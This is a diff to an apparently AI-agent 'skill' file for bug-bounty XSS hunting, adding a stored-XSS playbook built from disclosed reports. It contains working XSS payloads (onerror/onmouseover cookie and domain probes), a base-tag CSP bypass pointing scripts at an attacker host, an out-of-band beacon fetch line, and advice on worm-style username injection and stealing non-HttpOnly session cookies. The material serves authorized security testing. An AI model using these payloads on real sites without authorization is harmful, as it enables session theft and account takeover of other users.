@@ -1,8 +1,8 @@
 ---
 name: xss
-description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
+description: Hunting skill for xss vulnerabilities. Built from 178 public bug bounty reports. Use when hunting xss on any target, especially stored XSS (comments, usernames, bios, rich-text editors, report/collection names, chat, tickets, inbox) — includes the Stored XSS Playbook (field→render-surface map, canary authorship proof, cross-user browser verification, sanitizer timing, base-tag CSP bypass, sibling-endpoint retesting, severity ladder). For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
 sources: github, hackerone_public
-report_count: 174
+report_count: 178
 ---
 
 ## Autonomous Testing Priority
@@ -80,7 +80,7 @@ await page.acceptDialog("text");          // prompt() input
 
 For `confirm(1)` and `prompt(1)` the control matters: `acceptDialog()` returns truthy/enters the value, `dismissDialog()` returns false/cancels. If the operator takes control or asks to cancel, stop and do not route around it.
 
-**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.
+**For stored XSS:** storing the payload is not the finding — a *render surface* that shows it unencoded to a *different viewer* is. Inject into a field other pages display (comments, usernames, profile signature, report/collection names, ticket titles), then enumerate every place that value is rendered (entity page, index/list, nav/header, profile, admin/moderation view, email). The full loop — field inventory, proof of authorship, cross-user browser verification, sibling endpoints, sanitizer timing and CSP — is in **Stored XSS Playbook** below.
 
 ---
 
@@ -496,6 +496,235 @@ So when a blocklist matches `<script>` literally (a case-sensitive regex/WAF rul
 
 ---
 
+## Stored XSS Playbook — store once, enumerate every render surface
+
+Stored XSS is not "I posted a payload and it came back". It is a data-flow bug:
+one **write sink** → one or more **read sinks** → one or more **viewers**.
+Every step must be proven separately, because applications routinely encode the
+value on the page where you submitted it and render it raw on another page,
+in a different context, for a different audience.
+
+Ground truth from disclosed reports: Acronis #1084183 ($50, Medium) was a
+*profile signature* rendered on a public profile; Shopify #1147433 ($5,300,
+Medium 5.4) was a *rich-text HTML editor* on `/admin/product` and
+`/admin/collections`; MoPub #485748 ($700, High) was a *report name* shown to
+anyone opening the report; GitLab #1481207 (High 8.7) was *Markdown HTML
+injection* chained to a `<base>` CSP bypass. Same primitive, wildly different
+payouts — the difference is always render surface, viewer privilege, and proof.
+
+### 1. Build the field → render-surface map before payloading
+
+List every writable field, then for each one find **all** read sinks. Do not stop
+at the response to your own POST.
+
+| Write field | Surfaces to check after storing |
+|---|---|
+| Comment / review / note / reply | entity page, list page, "latest activity", quote/reply view, notification email, moderation queue, API JSON rendered into DOM |
+| Username / handle | comment author, @-mentions, nav dropdown, profile page, activity feed, invite/member lists, emails |
+| Display name / full name | nav, profile header, admin user list, emails, invoices, audit log |
+| Profile bio / signature / "about" | public profile, tooltip/popover, hover card, member directory, RSS/Atom |
+| Job title / company / label / tag / collection name | list + detail views, filters, breadcrumbs, exported CSV/PDF |
+| Support ticket subject/body, chat message, inbox message | agent console, ticket list, email transcript, customer portal |
+| Report / dashboard / saved-view name | report list, report header, shared/published report, scheduled email |
+| Uploaded filename / title / alt text | gallery, admin media library, download page, error messages |
+| Rich-text / HTML editor / Markdown source | detail page, rendered preview, revision history, wiki/README, sitemap |
+
+Rules:
+
+- **The same string can be safe in one sink and live in another.** Test the
+  text sink *and* the attribute sink (`title="…"`, `alt="…"`, `href="…"`) *and*
+  the JS sink (`var x = "…"`, JSON echoed into a script block). Each needs its
+  own context probe (`aaa"bbb'ccc<ddd>eee&fff`).
+- **A username/bio is a worm vector**, not a self-XSS: it is rendered next to
+  every comment/post the account makes. One account with a malicious username
+  infects every page it touches (#1084183 pattern).
+- **Private surfaces still count** — admin ticket views, moderation queues and
+  notification emails are the high-value readers. Plant early, check later
+  (see **OOB-Or-It-Didn't-Happen Gate**).
+- **Edit and delete flows re-render too**: update the stored value, then check
+  the page, the revision history, and the "deleted" tombstone.
+
+### 2. Store with a unique canary and prove authorship
+
+Other testers' payloads are already on shared targets (our lab page carried
+`confirm(778832)` and `confirm(100)` before we arrived). Never reuse a canary
+you did not create, and never claim a dialog you cannot attribute.
+
+1. Capture the **baseline page before writing** and `grep` for your canary —
+   it must be absent (count 0). Keep that file as evidence.
+2. Use a unique number per sink: `qa-735194`, `confirm(735194)`,
+   `document.title='XSS_735195'`. Record the exact timestamp/author row the app
+   renders next to it.
+3. After writing, fetch the render page as a **different identity** (logged-out
+   or second account) and confirm the payload is in the response *for that
+   viewer*. This is the stored-XSS equivalent of a reflection check.
+4. Keep a small ledger: `canary → field → render URL → viewer context → status`.
+   If a payload mysteriously disappears, the ledger tells you whether it was
+   overwritten, moderated, or never stored.
+
+### 3. Hidden, constrained and identity fields
+
+The UI is not the API. Every field the browser sends is attacker-controlled.
+
+- **Hidden inputs and `action` selectors** (`movie_id`, `action=add_comment`,
+  `movie_title`, `auth_type=register`) — replay the request with your own values
+  and extra fields. A hidden `movie_title` is often ignored at render time, but
+  the same hidden pattern feeds audit logs, emails and admin lists.
+- **Selects / radio / badge pickers** (`rating`, `feeling`, `priority`,
+  `category`) — the fixed option list is client-side; POST an arbitrary string.
+  In our lab the "feeling" badge stored and rendered raw despite a closed
+  dropdown.
+- **Registration fields** — username, full name, company, job title. Register a
+  throwaway account with the payload in each field, then browse as a guest.
+  Email verification is frequently absent; do not assume it blocks storage.
+- **Avatar/cover URLs, website/social links** — `javascript:` in `href`, or a
+  `data:` URI in `src`, with no tag needed at all.
+
+### 4. Rich-text / HTML editors (#1147433 pattern)
+
+When a product has a "Show HTML" / source / Markdown mode, the sanitizer is
+usually the only defense:
+
+```html
+">]<img src=x onerror=alert(document.domain)>
+"><img src=x onerror=alert(document.cookie)>
+```
+
+- Submit through the **editor's source mode**, save, then open the *public*
+  entity page (not the editor) and check the unencoded tag.
+- Test every sibling editor: product, collection, gift card, page, blog post,
+  email template. A fix applied to one controller often misses the others; the
+  Shopify report was extended to `/admin/gift_cards/products` after triage.
+- After the vendor ships a fix, **retest the exact field** — Shopify reverted
+  their first patch, and MoPub's first fix left account-settings and report-tab
+  endpoints vulnerable (#485748 follow-up #503298).
+
+### 5. Markdown, sanitizer timing and CSP (#1481207 pattern)
+
+Markdown/wiki/README renderers add three distinct injection stages. They behave
+differently and need different payloads:
+
+1. **Stage 1 — server-rendered initial HTML**: the payload is in the first
+   response (issue description, wiki page, README on a user profile, project
+   description). Full markup is live before any client-side sanitizer runs.
+2. **Stage 2 — post-load DOM**: comments/notes fetched by JS and inserted into
+   the DOM. Sanitizers such as DOMPurify may run *after* insertion, so tags and
+   event handlers execute for a split second; CSP is then the only thing left.
+3. **Stage 3 — client-side preview / error rendering**: the value is composed
+   by JS from input; look for `innerHTML` sinks and MutationObserver-driven
+   re-renders.
+
+Practical checks:
+
+- Does the page allow `<base href=https://attacker.tld>`? If yes, **every
+  relative script URL on the page resolves to your host**. If those `<script>`
+  tags carry the CSP nonce, the browser will happily load and execute your
+  file — a full CSP bypass with no inline script at all:
+  ```html
+  <base href=https://attacker.tld>
+  ```
+  Serve the exact relative paths the page requests (`/assets/webpack/*.js`) and
+  a redirect-all `.htaccess` while testing; this survives asset-hash changes.
+- Transient execution before sanitization: if CSP blocks inline but not
+  same-origin script loads, combine a stage-1 injection with an
+  `<iframe srcdoc>`, `<meta http-equiv=refresh>`, or a same-origin script
+  gadget. On self-hosted/low-CSP instances the same payload gives full XSS.
+- Script gadgets: allowlisted `data-*` attributes plus framework code that
+  interpolates them into HTML (e.g. jQuery `.attr('title')` → `$('<p>…')`).
+  Look for `data-remote`, `data-method`, `data-url`, `data-confirm` handlers.
+- If CSP has no `unsafe-inline`, do not declare "not vulnerable" — pivot to a
+  `<base>` hijack, an SVG/HTML upload on the same origin, or a JSONP endpoint on
+  an allowlisted host (see **Chain 4**).
+
+### 6. Sibling endpoints, partial fixes and duplicates
+
+One root cause is rarely one endpoint. When you confirm a stored sink, sweep:
+
+- the same field on other object types (product / collection / gift card /
+  page / blog / email template),
+- the same controller under other routes (`/admin/...`, `/api/...`, mobile API),
+- other tenants/stores in the same SaaS,
+- the public vs admin render of the same row.
+
+Report the shared root cause once, list every endpoint and every payload that
+still fires, and keep the list for retest. If a follow-up shows a remaining
+endpoint after the "fix", reopen or file a bypass report with the new endpoint
+and the retest evidence — it is a new finding, not a duplicate.
+
+### 7. Severity ladder for stored XSS (do not inflate)
+
+| Situation | Typical severity |
+|---|---|
+| Payload renders only on a page the author themselves views (self-XSS), no CSRF trigger | Low / N/A |
+| Public page, any visitor executes | Medium–High |
+| Viewer is admin/moderator/support agent (privilege escalation) | High |
+| Session cookie JS-readable (no `HttpOnly`) or token exfil → account takeover | High |
+| Username/bio rendered on every page → worm/mass compromise | High–Critical |
+| CSP bypass + token creation (GitLab-class) | High |
+
+An `alert()` alone proves execution, not impact. State what the JS can reach:
+`document.cookie` (is `HttpOnly` set?), same-origin APIs, CSRF tokens, admin
+endpoints. If the only victim is the author, do not file it as stored XSS
+unless you can chain a CSRF/state-change trigger (**Chain 2**).
+
+### 8. Stored-XSS evidence checklist
+
+1. Baseline file with the canary absent (`grep -c` = 0) and its timestamp.
+2. The write request (or a redacted equivalent) and the stored row's author +
+   timestamp as rendered by the app.
+3. Render URL opened in a **fresh, cookie-less browser context** with a dialog
+   observed (`Page.javascriptDialogOpening` via CDP, or ego `acceptDialog()`);
+   save the event JSON and a screenshot scrolled to the payload.
+4. A second render surface checked (list/profile/nav) — proves scope, not just
+   one page.
+5. Response headers for the render page: `Content-Security-Policy`,
+   `Content-Type`, `Cache-Control`, `Set-Cookie` (`HttpOnly`/`Secure`/`SameSite`).
+6. For private/admin surfaces where you cannot log in as the viewer, use an OOB
+   beacon (`fetch('//bxss-<tag>.<collab>/x')`) and wait.
+7. Note whether the payload persists after edit/delete, and clean up test
+   content on production programs when the policy requires it.
+
+### 9. Disclosed-report calibration
+
+| Report | Program / severity | Sink and payload core | Why it paid | Takeaway |
+|---|---|---|---|---|
+| #1084183 | Acronis, Medium, $50 | Profile **signature**: `<xss onmouseover="alert(1)">test</xss>` | Public profile page executes for any visitor; bounty low because impact is one profile at a time | Custom/unknown tags with event handlers still parse; profile/bio fields are a real sink, not just comments |
+| #1147433 | Shopify, Medium 5.4, $5,300 | **Rich-text HTML editor** (product / collection description): `">]<img src=x onerror=alert(document.domain)>` | Admin context, source-mode bypass, sibling endpoint `/admin/gift_cards/products` also vulnerable | Always test "Show HTML" mode and every sibling editor; a per-controller fix leaves copies live |
+| #485748 | MoPub/Twitter, High, $700 | **Report name**: `"><img src=x onerror=alert(document.domain)>` | Name rendered in every view of the saved report; same root cause across many endpoints (#492913, #492444, #487370, #485736) | "Name/title" fields are stored sinks; a broad fix may still miss fields — retest each and file the remainder (#503298) |
+| #1481207 | GitLab, High 8.7 | **Markdown HTML injection + `<base href=https://attacker>`** | Base tag re-points CSP-nonced relative script URLs to attacker host → full CSP bypass | When CSP blocks inline, look for base-tag/JSONP/upload bypasses; client-side DOMPurify after insertion gives transient execution; distinguish stage-1 vs stage-2 sinks |
+
+Common thread: none of these were found by re-reading the submit response. Each
+required opening a *different* page as a *different* viewer after the value was
+stored — and three of the four needed a second endpoint or a second pass after
+a partial fix.
+
+### 10. Worked example — three sinks, one page
+
+A PHP movie app exposed three stored sinks on the same detail page; all were
+confirmed in a cookie-less browser, not just by curl:
+
+1. **Comment body** — `POST /<id>` with `action=add_comment&comment=…` stored
+   `qa-735194 '"<><img src=x onerror=confirm(735194)>` raw in a `<div>`. The
+   first POST silently no-op'd because the hidden `action=add_comment` field was
+   missing; always copy the *complete* form payload, hidden fields included.
+2. **Username** — registration accepted
+   `qa7361x"><img src=x onerror=confirm(736101)>`; the app rendered it raw in the
+   nav **and** in every comment card's `@username`. A throwaway account posting
+   one normal comment turned it into a public payload on `/102`.
+3. **Feeling badge** — a closed dropdown, but the POST value was stored verbatim;
+   `"><img src=x onerror=confirm(736103)>` executed from
+   `<span class="comment-feeling-tag">`.
+
+What made the proof hold up: baseline captured before posting (canary absent),
+author+timestamp row from the app distinguishing our comments from earlier
+testers' `confirm(778832)`/`confirm(100)`, dialogs observed in a fresh guest
+Chrome, and `Set-Cookie: PHPSESSID=…; path=/` with no `HttpOnly` — so the same
+script could read the session cookie and take over the account. The hidden
+`movie_title` field, by contrast, was stored but never rendered → `no-reflection`,
+and was dropped rather than padded into a false finding.
+
+---
+
 ## Crown Jewel Targets
 
 XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:
@@ -527,6 +756,7 @@ For blind and stored XSS — claims require an out-of-band confirmation, the sam
 
 - A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
 - For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
+- **Public stored XSS has a second, equally valid proof**: fetch the render page in a fresh browser profile that has never authenticated and observe the dialog (`Page.javascriptDialogOpening`) or a deterministic DOM change. The value was stored server-side and executed for a viewer the author is not — no OOB needed. Use the OOB beacon only for private/admin-only surfaces you cannot open yourself.
 - The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.
 
 ### Where to plant blind-XSS beacons
@@ -625,7 +855,7 @@ $(location
 
 9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.
 
-10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.
+10. **Attempt stored XSS in profile/metadata fields** — Username, display name, bio/signature, job title, tag/collection/report names, ticket subjects, chat messages — these render in many contexts and often have weaker validation. Store with a unique canary, then walk the full **Stored XSS Playbook** (every render surface, a fresh unauthenticated viewer, sibling endpoints) before claiming it.
 
 11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.
 
